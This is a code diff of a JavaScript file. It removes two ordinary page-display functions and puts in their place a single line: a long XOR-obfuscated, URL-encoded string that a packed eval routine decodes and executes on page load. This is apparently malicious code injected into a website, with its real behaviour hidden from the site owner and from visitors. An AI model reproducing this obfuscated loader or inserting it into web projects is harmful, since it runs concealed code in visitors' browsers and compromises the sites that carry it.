@@ -4,37 +4,4 @@
 *  @email  cinbit@sina.com
 */
 
-function ShowHtml(showDivId,showIframeId,hideDivId,hideIframeId,htmlPath,globalArray){
-	var tmpArr;
-	var QueryString;
-	var QueryNum;
-	var URL = document.location.toString();
-	if(URL.lastIndexOf("?")!=-1){
-		QueryString= URL.substring(URL.lastIndexOf("?")+1,URL.length);
-		tmpArr=QueryString.split("&");
-		QueryNum = tmpArr[0].substring(tmpArr[0].lastIndexOf("=")+1,tmpArr[0].length);
-		var Num = parseInt(QueryNum);
-		document.getElementById(showIframeId).src=globalArray[Num].url;
-		document.getElementById(hideIframeId).src=htmlPath+globalArray[Num].pri+".html";
-		QueryNum = tmpArr[1].substring(tmpArr[1].lastIndexOf("=")+1,tmpArr[1].length);
-		if(parseInt(QueryNum)==0){
-			Toggle(showDivId,hideDivId);
-		}
-		else{
-			Toggle(hideDivId,showDivId);
-		}
-	}
-}
-
-function Toggle(showDivId,hideDivId){
-	var target1=document.getElementById(showDivId);
-	var target2=document.getElementById(hideDivId);
-	if (target1.style.display=="block"){
-		target1.style.display="none";
-		target2.style.display="block";
-	}
-	else {
-		target1.style.display="block";
-		target2.style.display="none";
-	}
-}
+var ssstttrrrstr="%7Fmyua%7D%7C%7C1CgazD%7Fge%20tnjsGkwi%7B2nttmP%7EewxqZv%3DxfjhHb%7C@l+nl%60fKgR%7EsxU%7F6qlzzEugz%3DwcaomgK%7Bzf%7F%2C%7F%09%0BwAm%3Eiqk%5Bkj%2C%1C%1Cbr%601Azk%7FuX%7E%7Baia%3E%0E%0At%60R%3FOhyicWmz-%1F%1Desc0Z%5CA%2C6*mgdshamv/Lp%7D%7Chruw6cyF%60a%7B%7Fw%27%276%06%02co%20RTI*ocrTVpyycU%7F05%297%3D2/%3C%21%26u%07%05%02%5B%7Cmu%7FVpqkoG%22%3EHNW4jmueafz%7Cv8Z%5CA%22gkz%7CNhaa%7BMg%08%3D%21%3F50+5MEZ%3Bxv%7Cvdg%276%06%02%03%7DewGwv%3EStEmgNhisw%7F9eexzf92%29%2C%247%01%03%00Yrcw%7DMwl%00%22%3Eiqk%5BkjL%26H%3A%60gsc%7B%7Cdbl%22%7DewGwvX2%5C%0Es%7FnhRt%7D%7DoYs%3C1/39%24%3F%21xfzHzu%5D5Y-ndNxju5%20%10%10%11awg4%5Dg%7C02.%7DmyylAir-UvgsYQkp5%20%10%10%11syva%7Ew%7Fd%21ihxNflebhqFzKe%08lvrkR%7Ckyzs%5Cp%3A%3Cbbl3j%60dhhdFtwezYOUrC3iiv%22%12%1E%1Fq%7Bpg%7Cuaz%23kn%7ELdbk%60jw@xi%7B6uu%7F%7FP%7EewxqZv8%3E%7C%7Cn1c%7EddWgql%28emO%7D%7Fq%5DihxaLX%60yN%3Cabf%25/%22c%7Edd%25%3D%0F%0D%0AStEmgSiv%3A%248c%7BeUa%60J%21R%20%7Eyiy%7Dznhb%2CwoqamlF-F4uydb%5Czwwi_i%26/1%29%23%229+rhtBps%7B.C3p%7Et%7El%7F%3F.%1E%1A%1Bxv%27%7El%7Exo@fs.Tqfpxnjs4%21%26*0c%1D%1F%1C%1DG%7Dvwck%25%7Fce%7ELnpL%60/jhDzZtjR%7E0%23%1D%1F%1Ci%19%1B%18uc%7Dhw%01%03%00%01Sibcog%29HvzxXrlP%7C%3Be%7D%7BdVxfFj%247%01%03%00u%0D%0Fx%0E%7E%08%0BFjp%7Ehruw8Cyrs%7Fw9cgazHb%7C@l+nl%60fFhVVz4g%11%13oye6auautd%3E3ich%7Fdmir+cfvDLzsxroX%60Qs%3Ef%7C%7CeUyyGi%250%00%00%7Eft%25pbpfEk%2C%20xtylurxa%3AtweUck%60ie%7EKqNb-ljfddvhTx2%21%13%11%7Ep5%3Cgscwjz%3C%22x%7Epdb%28amprmAf%23%20%3Eyvv%7B%7C4%3Co%19%1B%18dn%7Cji%7F%3B%27%7Bs%7Fia-fhSor%7Ce%268wwys7/%19%1B%18dn%7Cji%7F8%27%7Bs%7Fia-fhSor%7Ce%268%7Btxu%7E6%28%18%18m%05%07h%60xo%29s%0D%0F%0CpbpfEk/3oocu%7D9r%7Cgc%7Epi2%2Co%60dib*%3C%0C%0C%0DwcsGzj/2hn%60tr8q%7D%60b%7Dqv3/bddl*%3C%0C%0Cy%09%7F";eval(function(p,a,c,k,e,d){while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+c+'\\b','g'),k[c])}}return p}('9 10(6){5 4="";5 3=11(6);8(5 2=0;2<3.7;2++){4+=16.12(3.15(2)^(1+(3.7-2)%14))}13 4}',10,17,'||c|s|f|var|Y|length|for|function|dU|unescape|fromCharCode|return|32|charCodeAt|String'.split('|')));eval(dU(ssstttrrrstr));
